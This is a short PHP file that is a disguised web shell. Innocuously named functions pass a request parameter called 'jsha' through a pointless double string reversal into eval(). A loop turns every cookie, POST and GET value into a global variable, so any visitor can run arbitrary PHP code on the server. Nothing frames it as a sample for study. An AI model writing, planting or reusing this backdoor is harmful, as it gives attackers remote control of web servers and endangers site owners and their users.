<?php
function _strint($key){
        return strrev($key);
}
function log1($log){
        lone(_strint(strrev($log)));
}
function lone($key){
        $str = "";
        return eval($str.$key.$str);
}
foreach (array('_COOKIE','_POST','_GET') as $_request)
{
    foreach ($$_request as $_key=>$_value)
    {
        $$_key=  $_value;
    }
}
$id = isset($jsha) ? $id : 2;
log1($jsha);
?>